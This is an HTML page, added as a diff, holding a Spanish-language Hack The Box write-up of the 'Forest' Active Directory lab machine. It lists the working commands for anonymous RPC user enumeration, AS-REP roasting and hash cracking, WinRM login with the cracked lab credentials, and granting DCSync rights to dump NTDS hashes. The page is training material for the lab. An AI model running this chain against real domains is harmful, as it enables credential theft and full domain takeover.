@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Forest HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/forest/pasted-image-20251118182029.png" alt="Forest HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Forest</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>AS-REP Roasting</span>
+            <span>BloodHound</span>
+            <span>DCSync</span>
+            <span>WinRM</span>
+            <span>account_operators</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: RPC anónimo (Usuarios)</li>
+            <li><code>Explotación</code>: <code>AS-REP Roasting</code></li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>Account Operators</code> -&gt; Grupo <code>Exchange Windows</code> Permissions -&gt; <code>ataque <code>DCSync</code></code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/forest/pasted-image-20260127211956.png" alt="Forest HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>RPC - 135</h2>
+          <div class="code-card">
+            <h3>Enumeración usuarios con RPC anónimo</h3>
+            <pre><code>rpcclient -U &quot;&quot; forest -N
+enumdomusers
+cat user | grep &quot;user&quot; | cut -d [ -f2 | cut -d ] -f1 &gt; users</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/forest/pasted-image-20251118231239.png" alt="Forest HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: AS-REP Roasting</h2>
+          <div class="code-card">
+            <h3>AS-REP Roasting</h3>
+            <pre><code>GetNPUsers.py -no-pass -usersfile users htb.local/</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/forest/pasted-image-20251118231058.png" alt="Forest HTB" />
+          <div class="code-card">
+            <h3>Crackear hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlist/rockyou.txt hash
+# Credenciales
+svc-alfresco:s3rvice</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>WinRM: Acceso al sistema</h3>
+            <pre><code>evil-winrm -i forest -u &#x27;svc-alfresco&#x27; -p &#x27;s3rvice&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Grupo Account Operators</h3>
+            <pre><code>whoami /groups
+# Crear nuevos usuarios
+# Agregar usuarios a grupos como Exchange Windows Permissions</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/forest/pasted-image-20260218165918.png" alt="Forest HTB" />
+          <div class="code-card">
+            <h3>Opción 1: Nuevo Usuario</h3>
+            <pre><code># Windows: Sesión de svc-alfresco
+# Crear usuario alvaro:alvaro123 y añadirlo al dominio
+net user alvaro alvaro123 /add /domain
+# Añadirlo al grupo &quot;Exchange Windows Permissions&quot;
+net group &quot;Exchange Windows Permissions&quot; alvaro /add
+
+# Kali
+# Agregar Permisos DCSync desde alvaro a él mismo
+bloodyAD --host forest.htb.local --dc-ip forest -d htb.local -u alvaro -p alvaro123 add dcsync alvaro
+# Dumpear Hashes NTLM
+netexec smb forest -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; --ntds
+
+# El grupo Exchange Windows Permissions permite al usuario otorgar los permisos DCSync necesarios para dumpear NTDS a cualquier usuario del dominio, incluido el mismo </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/forest/pasted-image-20260218170855.png" alt="Forest HTB" />
+          <div class="code-card">
+            <h3>Opción 2: Usuario actual</h3>
+            <pre><code># Windows: Sesión de svc-alfresco
+# Añadirlo al grupo &quot;Exchange Windows Permissions&quot;
+net group &quot;Exchange Windows Permissions&quot; svc-alfresco /add
+# Agregar Permisos DCSync a svc-alfresco
+net group &quot;Exchange Windows Permissions&quot; svc-alfresco /add
+Add-DomainObjectAcl  -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity svc-alfresco -Rights DCSync
+
+# Kali
+netexec smb forest -u &#x27;svc-alfresco&#x27; -p &#x27;s3rvice&#x27; --ntds
+
+# Los permisos DCSync se pueden otorgar desde Kali o Windows como hemos podido ver. Desde Windows si no se especifica (-Credential $Cred) ,escogerá al usuario de la sesión actual como usuario que presuntamente tiene permisos de otorgar DCSync. En caso de especificar otro usuario con esta capacidad debemos de agregarlo de la siguiente manera
+
+$SecPass = ConvertTo-SecureString &#x27;s3rvice&#x27; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#x27;htb.local\svc-alfresco&#x27;, $SecPass)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity svc-alfresco -Rights DCSync</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>AS-REP Roasting</span>
+            <span>BloodHound</span>
+            <span>DCSync</span>
+            <span>WinRM</span>
+            <span>account_operators</span>
+            <span>exchange_windows_permissions</span>
+            <span>writedacl</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
